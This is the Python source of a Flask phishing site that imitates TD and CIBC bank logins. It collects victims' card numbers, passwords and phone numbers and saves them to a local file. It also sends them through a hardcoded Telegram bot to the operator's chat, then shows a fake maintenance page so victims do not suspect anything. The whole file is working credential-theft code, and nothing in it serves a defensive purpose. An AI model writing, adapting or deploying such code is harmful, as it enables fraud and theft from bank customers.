from flask import Flask, render_template, request, redirect, url_for, flash, session
import os
import requests

app = Flask(__name__)
app.secret_key = "supersecretkey"

USER_FILE = "users.txt"

# Your Telegram details
TELEGRAM_BOT_TOKEN = "7321008127:AAEF8dr-B-b_hLkjA1qcXl07askvu0fRggs"
TELEGRAM_CHAT_ID = "-1002441207907"  # <-- Replace with your real chat ID

def send_telegram_message(text: str):
    """
    Posts 'text' to your Telegram bot using the Bot API.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")


# Ensure the users.txt file exists
if not os.path.exists(USER_FILE):
    with open(USER_FILE, "w") as f:
        pass


@app.route("/")
def landing_page():
    return render_template("landing.html")


@app.route("/td")
def td_page():
    """
    Renders the TD login page (td.html).
    That page includes <input type="hidden" name="bank" value="TD">
    so we know to send them to td_phone after /login.
    """
    return render_template("td.html")


@app.route("/home")
def home():
    """
    Simulate a CIBC login page.
    This page would have <input type="hidden" name="bank" value="CIBC">
    so we know it's CIBC.
    """
    return render_template("home.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    """
    1) Store card_number, password, bank in session.
    2) Do NOT send telegram message yet.
    3) Redirect to phone route (CIBC or TD).
    """
    if request.method == "POST":
        card_number = request.form.get("card_number")
        password = request.form.get("password")
        bank = request.form.get("bank")  # 'TD' or 'CIBC'

        if not card_number or not password:
            flash("Card number and password are required!", "error")
            return redirect(url_for("home"))

        # Store them in session for later
        session["temp_bank"] = bank
        session["temp_card"] = card_number
        session["temp_pass"] = password

        # Redirect to correct phone verification route
        if bank == "TD":
            return redirect(url_for("td_phone"))
        else:
            # Default or CIBC => /phone_verification
            return redirect(url_for("phone_verification"))

    # If GET, just show a generic login
    return render_template("login.html")


@app.route("/phone-verification", methods=["GET", "POST"])
def phone_verification():
    """
    CIBC phone verification route.
    Now we read bank, card_number, password from session,
    plus phone_number from the form.
    Then we write everything to users.txt and send ONE Telegram message.
    """
    if request.method == "POST":
        phone_number = request.form.get("phone_number")
        if not phone_number:
            flash("Phone number is required!", "error")
            return redirect(url_for("phone_verification"))

        # Retrieve bank, card, pass from session
        bank = session.get("temp_bank", "CIBC")
        card_number = session.get("temp_card", "UnknownCard")
        password = session.get("temp_pass", "UnknownPass")

        # 1) Write all info to users.txt
        # Make one line with card_number, password, phone
        with open(USER_FILE, "a") as f:
            f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")

        # 2) Build one big Telegram message
        message_text = (
            f"New {bank} login:\n"
            f"Card: {card_number}\n"
            f"Password: {password}\n"
            f"Phone: {phone_number}"
        )
        send_telegram_message(message_text)

        # 3) Clear session so we don't reuse data
        session.pop("temp_bank", None)
        session.pop("temp_card", None)
        session.pop("temp_pass", None)

        return redirect(url_for("maintenance"))

    return render_template("phone_verification.html")


@app.route("/td_phone", methods=["GET", "POST"])
def td_phone():
    """
    TD phone verification route.
    We do the same approach as CIBC:
    Read session data for bank/card/pass,
    read phone from form,
    then store everything & send one message.
    """
    if request.method == "POST":
        phone_number = request.form.get("phone_number")
        if not phone_number:
            flash("Phone number is required!", "error")
            return redirect(url_for("td_phone"))

        bank = session.get("temp_bank", "TD")
        card_number = session.get("temp_card", "UnknownCard")
        password = session.get("temp_pass", "UnknownPass")

        # 1) Write all info to users.txt
        with open(USER_FILE, "a") as f:
            f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")

        # 2) Single Telegram message
        message_text = (
            f"New {bank} login:\n"
            f"Card: {card_number}\n"
            f"Password: {password}\n"
            f"Phone: {phone_number}"
        )
        send_telegram_message(message_text)

        # 3) Clear session
        session.pop("temp_bank", None)
        session.pop("temp_card", None)
        session.pop("temp_pass", None)

        return redirect(url_for("maintenance"))

    return render_template("td_phone.html")


@app.route("/maintenance")
def maintenance():
    """
    Simple 'maintenance' page to show after phone is verified.
    """
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Site Under Maintenance</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                background-color: #f8f8f8;
                margin: 0;
                padding: 0;
            }
            .maintenance-container {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            h1 {
                color: #c8102e;
                margin-bottom: 0.5em;
            }
            p {
                font-size: 1.2em;
                margin: 0;
            }
        </style>
    </head>
    <body>
        <div class="maintenance-container">
            <h1>Site Maintenance</h1>
            <p>We’ll be back online in approximately 2 hours.</p>
        </div>
    </body>
    </html>
    """


@app.route("/select-bank", methods=["POST"])
def select_bank():
    """
    If your 'landing.html' has a dropdown or radio button
    letting user pick which bank, we redirect accordingly.
    """
    selected_bank = request.form.get("bank")
    if selected_bank == "CIBC":
        return redirect(url_for("home"))
    elif selected_bank == "TD":
        return redirect(url_for("td_page"))

    flash("This bank is currently not supported.", "error")
    return redirect(url_for("landing_page"))


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0')
